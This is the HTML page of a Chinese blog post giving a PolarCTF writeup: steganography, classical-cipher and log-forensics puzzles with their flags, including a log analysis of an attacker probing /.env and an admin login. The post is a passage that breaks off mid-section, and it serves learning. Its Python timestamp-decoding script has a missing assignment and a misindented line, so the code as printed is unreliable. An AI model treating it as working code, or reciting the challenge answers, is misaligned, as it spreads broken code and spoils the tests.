@@ -1,0 +1,655 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>polarCTF Writeup | joke的小世界</title><meta name="author" content="joke"><meta name="copyright" content="joke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PolarCTF WriteupMisc麦填本题思路如下： 额，这题有点难绷其实,先在010 editor里打开图片发现在FF D9文件尾后面有一个base64和png:   Base64那个解密一下是：sevenightnine，这是最难绷的这个在flag里是789(我还傻傻的把sevenightnine当做后半段) OK把png提取出来从89 50开始，得到一张二维码，扫一下：   把这个fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="polarCTF Writeup">
+<meta property="og:url" content="https://simple9656.github.io/2026/04/07/polarCTF-Writeup/index.html">
+<meta property="og:site_name" content="joke的小世界">
+<meta property="og:description" content="PolarCTF WriteupMisc麦填本题思路如下： 额，这题有点难绷其实,先在010 editor里打开图片发现在FF D9文件尾后面有一个base64和png:   Base64那个解密一下是：sevenightnine，这是最难绷的这个在flag里是789(我还傻傻的把sevenightnine当做后半段) OK把png提取出来从89 50开始，得到一张二维码，扫一下：   把这个fl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/1920/1080?random=3">
+<meta property="article:published_time" content="2026-04-07T00:27:53.000Z">
+<meta property="article:modified_time" content="2026-04-07T04:31:23.111Z">
+<meta property="article:author" content="joke">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="polarCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/1920/1080?random=3"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "polarCTF Writeup",
+  "url": "https://simple9656.github.io/2026/04/07/polarCTF-Writeup/",
+  "image": "https://picsum.photos/1920/1080?random=3",
+  "datePublished": "2026-04-07T00:27:53.000Z",
+  "dateModified": "2026-04-07T04:31:23.111Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "joke",
+      "url": "https://simple9656.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/9.jpg"><link rel="canonical" href="https://simple9656.github.io/2026/04/07/polarCTF-Writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'polarCTF Writeup',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/transparent.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/pink/pace-theme-minimal.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div class="bg-animation" id="web_bg" style="background-color: #eee;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://picsum.photos/1920/1080?random=3);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/9.jpg" alt="Logo"><span class="site-name">joke的小世界</span></a><a class="nav-page-title" href="/"><span class="site-name">polarCTF Writeup</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">polarCTF Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-07T00:27:53.000Z" title="发表于 2026-04-07 08:27:53">2026-04-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-07T04:31:23.111Z" title="更新于 2026-04-07 12:31:23">2026-04-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/ctf-wp/">ctf-wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PolarCTF-Writeup"><a href="#PolarCTF-Writeup" class="headerlink" title="PolarCTF Writeup"></a>PolarCTF Writeup</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="麦填"><a href="#麦填" class="headerlink" title="麦填"></a>麦填</h3><p>本题思路如下：</p>
+<p>额，这题有点难绷其实,先在010 editor里打开图片发现在FF D9文件尾后面有一个base64和png:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps2-1775521801760-1.jpg" alt="img"> </p>
+<p>Base64那个解密一下是：sevenightnine，这是最难绷的这个在flag里是789(我还傻傻的把sevenightnine当做后半段)</p>
+<p>OK把png提取出来从89 50开始，得到一张二维码，扫一下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps3-1775521817421-3.jpg" alt="img"> </p>
+<p>把这个flag和789拼一下就是flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;win789&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><p>本题思路如下：</p>
+<p>密文：ptdh{dqpfsajpsvjgSVgbVQIFLWXZ}</p>
+<p>key: 长度为 5\4</p>
+<p>开机时间戳 1630416000</p>
+<p>除了密文，其他给的信息我没看出来有啥用。</p>
+<p>观察密文格式 ptdh{…}，与flag{}对比，将密文头部和已知的明文头部对齐，尝试计算它们在字母表中的偏移量：</p>
+<p>p(15)-f(5) &#x3D;10(k)</p>
+<p>t(19)-l(11)&#x3D;8(i)</p>
+<p>d(3)-a(0)&#x3D;3(d)</p>
+<p>h(7)-g(6)&#x3D;1(b)</p>
+<p>由此，我们得出了维吉尼亚密码密钥：kidb</p>
+<p>然后用在线网站解密即可：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/vigenere">https://ctf.bugku.com/tool/vigenere</a></p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps4-1775521884444-5.jpg" alt="img"> </p>
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;timeisgoingfINdaLIFEBOUY&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PNG头的秘密"><a href="#PNG头的秘密" class="headerlink" title="PNG头的秘密"></a>PNG头的秘密</h3><p>本题思路如下：</p>
+<p>查看题目的1.txt:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps5-1775521938169-11.jpg" alt="img"> </p>
+<p>先用010 editor查看图片：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps6-1775521938169-13.jpg" alt="img"> </p>
+<p>把文件尾的数据提取出来，重新开一个文件：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps7-1775521938169-7.jpg" alt="img"> </p>
+<p> 密钥和png的核心标识有关，0x89就是，二进制异或一下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps8-1775521938169-8.jpg" alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps9-1775521938169-10.jpg" alt="img"> </p>
+<p>发现是一段base64:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps10-1775521938169-9.jpg" alt="img"> </p>
+<p>cyberchef一把梭一下得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps11-1775521938169-12.jpg" alt="img"></p>
+<h3 id="老鹰捉小鸡"><a href="#老鹰捉小鸡" class="headerlink" title="老鹰捉小鸡"></a>老鹰捉小鸡</h3><p>本题思路如下：</p>
+<p>这题就两件事：</p>
+<p>拿到一个zip和看eagle_code:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps12-1775521986308-23.jpg" alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps13-1775521986308-24.jpg" alt="img"> </p>
+<p>这是flag后半段，前半段有提示：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps14-1775521986307-22.jpg" alt="img"> </p>
+<p>搜一下就找到了：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/image-20260407083331829.png" alt="image-20260407083331829"> </p>
+<p>简单的base64,解出来把flag拼一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;catch you&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="隐藏的二维码"><a href="#隐藏的二维码" class="headerlink" title="隐藏的二维码"></a>隐藏的二维码</h3><p>本题思路如下：</p>
+<p>这题用随波逐流一把梭发现没啥线索：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps16-1775522051029-29.jpg" alt="img"> </p>
+<p>尝试一下lsb(stegsolve),果然发现了二维码：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps17-1775522066991-31.jpg" alt="img"></p>
+<p>用QR 扫一下得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps18-1775522078541-33.jpg" alt="img"> </p>
+<h3 id="Sis-puella-magic！"><a href="#Sis-puella-magic！" class="headerlink" title="Sis puella magic！"></a>Sis puella magic！</h3><p>本题思路如下：</p>
+<p>这道题很好玩，第一步：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps19-1775522109273-35.jpg" alt="img"> </p>
+<p>打开起源之声，听一下，很明显的摩斯电码用网站解一下码：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps20-1775522109273-36.jpg" alt="img"></p>
+<p>得到何人的过往这个zip的密码：sispuellamagic，解压一下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps21-1775522122121-39.jpg" alt="img"> </p>
+<ol>
+<li>zip里全被加密了，应该是要从另外两个找密码，先看png:</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps22-1775522122121-40.jpg" alt="img"> </p>
+<p>这个要反过来看：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps23-1775522122121-41.jpg" alt="img"> </p>
+<p>唯一要注意的是i这个不要了（试过之后发现的，一开始把i加上了）。这个读取后是：magiciswitch（看起来语义是清晰的）</p>
+<p>而那个音频文件，听上去没啥提示，用deepsound打开发现需要密码，看来是找对了，上面图片提取出来的就是密码：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps24-1775522143553-45.jpg" alt="img"></p>
+<p>得到一个文件提取一下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps25-1775522156324-47.jpg" alt="img"></p>
+<p>一大串base64,用cyberchef梭一下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps26-1775522174095-49.jpg" alt="img"> </p>
+<p>得到魔女文字（魔法少女小圆狂喜），找网站解一下：</p>
+<p><a target="_blank" rel="noopener" href="https://www.madorunes.cn/#/convert">https://www.madorunes.cn/#/convert</a></p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps27.jpg" alt="img"> </p>
+<p>得到hope,这是那个zip的密码，解压一下;</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps28.jpg" alt="img"></p>
+<p>看看hint:</p>
+<p>破解密码的时候意外触发魔女留下的魔法，被穿越到未来一个空白的房间里，这里只有一台电脑，里面是一些看不懂的文件，且电脑的时间永远固定在2035-01-11 11:11:11，，现在请你找到回去的方法</p>
+<p>时间戳比较，你把2035-01-11 11:11:11这个时间和每个txt里的</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps29.jpg" alt="img"></p>
+<p>创建时间相减，然后转成ASCII码就行了（在我试着前四个txt刚好是flag四个字母的时候发现的），这里我是手动做的，做完之后发现太慢了，让AI写了个脚本，遍历txt,读取后和源时间戳相减并转换为ASCII码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line"># 1. 基础配置</span><br><span class="line">folder_path = &#x27;./&#x27;  # 确保脚本和txt文件在同一个文件夹</span><br><span class="line">base_time_str = &quot;2035/1/11 11:11:11&quot;</span><br><span class="line">base_time = datetime.strptime(base_time_str, &quot;%Y/%m/%d %H:%M:%S&quot;)</span><br><span class="line"></span><br><span class="line">flag_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 2. 获取并排序文件名（防止乱序打印）</span><br><span class="line">files = [f for f in os.listdir(folder_path) if f.endswith(&#x27;.txt&#x27;) and f[:-4].isdigit()]</span><br><span class="line">files.sort(key=lambda x: int(x[:-4]))</span><br><span class="line"></span><br><span class="line">print(f&quot;[*] 开始解密魔法，基准时间: &#123;base_time_str&#125;&quot;)</span><br><span class="line">print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line"># 3. 逐个读取提取</span><br><span class="line">for filename in files:</span><br><span class="line">    index = int(filename[:-4])</span><br><span class="line">    file_full_path = os.path.join(folder_path, filename)</span><br><span class="line">    char_found = None</span><br><span class="line"></span><br><span class="line">    # 尝试多种编码方案读取</span><br><span class="line">    for encoding_type in [&#x27;utf-16&#x27;, &#x27;utf-8&#x27;, &#x27;gbk&#x27;]:</span><br><span class="line">        try:</span><br><span class="line">            with open(file_full_path, &#x27;r&#x27;, encoding=encoding_type, errors=&#x27;ignore&#x27;) as f:</span><br><span class="line">                content = f.read()</span><br><span class="line">                # 匹配“修改时间”后的日期字符串</span><br><span class="line">                time_match = re.search(r&quot;修改时间\s*[:：]\s*(\d&#123;4&#125;/\d&#123;1,2&#125;/\d&#123;1,2&#125;\s\d&#123;1,2&#125;:\d&#123;1,2&#125;:\d&#123;1,2&#125;)&quot;, content)</span><br><span class="line"></span><br><span class="line">                if time_match:</span><br><span class="line">                    file_time_str = time_match.group(1)</span><br><span class="line">                    file_timedatetime.strptime(file_time_str, &quot;%Y/%m/%d %H:%M:%S&quot;)</span><br><span class="line"></span><br><span class="line">                    # 计算秒数差并转为字符</span><br><span class="line">                    delta = int((file_time - base_time).total_seconds())</span><br><span class="line">                    char_found = chr(delta)</span><br><span class="line">                    flag_dict[index] = char_found</span><br><span class="line">                    break  # 成功匹配就跳出编码尝试</span><br><span class="line">        except Exception:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">    # 打印当前文件的提取状态</span><br><span class="line">    if char_found:</span><br><span class="line">        print(f&quot;[OK] 打开 &#123;filename:8&#125; | 提取字符: &#x27;&#123;char_found&#125;&#x27; | (ASCII: &#123;ord(char_found)&#125;)&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[??] 打开 &#123;filename:8&#125; | 提取失败：未发现有效时间格式&quot;)</span><br><span class="line"></span><br><span class="line"># 4. 最终整合</span><br><span class="line">print(&quot;-&quot; * 50)</span><br><span class="line">if flag_dict:</span><br><span class="line">    # 检查是否有序号缺失</span><br><span class="line">    max_idx = max(flag_dict.keys())</span><br><span class="line">    full_flag = &quot;&quot;</span><br><span class="line">    for i in range(max_idx + 1):</span><br><span class="line">        full_flag += flag_dict.get(i, &quot;?&quot;)  # 如果缺失某一位，用?占位</span><br><span class="line"></span><br><span class="line">    print(f&quot;[!] 最终整合结果: \n\n&#123;full_flag&#125;\n&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&quot;[-] 文件夹内没有提取到任何有效数据。&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>最后得到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Now_you_can_go_home&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="attack-log"><a href="#attack-log" class="headerlink" title="attack_log"></a>attack_log</h3><p>本题思路如下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps30.jpg" alt="img"> </p>
+<p>在log可以直接看到ip,看到login success就知道是这个ip:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps31.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;45.133.12.77&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps32.jpg" alt="img"> </p>
+<p>在nginx_access.log里搜索第一问的ip就可以看到时间：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps33.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2026-02-18 01:28:52&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps34.jpg" alt="img"> </p>
+<p>环境配置，第一反应应该想到env</p>
+<p>结果发现还真有,在nginx_access.log里：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps35.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/.env&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps36.jpg" alt="img"> </p>
+<p>外部攻击者对 &#x2F;admin 进行探测与登录尝试</p>
+<p>那么用户名就是admin 或者在auth.txt把user后面的都试一遍也行：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps37.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/image-20260407084214056.png" alt="image-20260407084214056"></p>
+<p>这个肯定是在mysql_general.log里找了：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps38.jpg" alt="img"> </p>
+<p>order很明显的，本身就有订单的意思</p>
+<p>日志里有一个更有说服力：</p>
+<p>2026-02-18T01:28:13 Query SELECT order_id,total FROM oc_order ORDER BY date_added DESC LIMIT 5;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;oc_order&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/image-20260407084253438.png" alt="image-20260407084253438"></p>
+<p>2026-02-18T00:00:04 Query SELECT product_id FROM oc_product WHERE status&#x3D;1 LIMIT 20;</p>
+<p>2026-02-18T01:28:20 Query SELECT product_id,model,price FROM oc_product ORDER BY date_added DESC LIMIT 5;</p>
+<p>这两条日志可以看出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;oc_product&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="百万赏金"><a href="#百万赏金" class="headerlink" title="百万赏金"></a>百万赏金</h3><p>本题思路如下：</p>
+<p>这道题就是要多尝试：</p>
+<p>干员，本次的行动任务非常艰巨，我们截获了博士的实验数据，但是这个文件被加密了，请你认真搜索，搞定就撤。</p>
+<p>已知实验数据加密规则严格遵循以下顺序执行：</p>
+<p>第一轮：对原始 Flag 执行凯撒密码加密（偏移量未知，偏移范围 1~10，仅对字母字符移位）</p>
+<p>第二轮：将凯撒加密后的字符串执行栅栏密码加密（密钥未知，密钥范围 2~4，加密方式为按W型读取，且标准型带有两个特殊字符）</p>
+<p>密文：DFGNBSZNGNMKFF</p>
+<p>那就逆推，先看看栅栏密码2-4（总共就三种可能一个一个试呗）：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps39.jpg" alt="img"></p>
+<p>然后试完发现用第四栏进行凯撒解密时有明确语义的字符串：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps40-1775522650199-64.jpg" alt="img"> </p>
+<p>Mode5那里：一百万哈夫币，正好对应百万赏金，这就是flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YIBAIWANHAFUBI&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="博士的实验数据"><a href="#博士的实验数据" class="headerlink" title="博士的实验数据"></a>博士的实验数据</h3><p>本题思路如下：</p>
+<p>密文：QJBXQJFXZAKL</p>
+<p>已知条件：明文 T(19) -&gt; 密文 X(23)；明文 F(5) -&gt; 密文 J(9)</p>
+<p>加密原理：仿射密码</p>
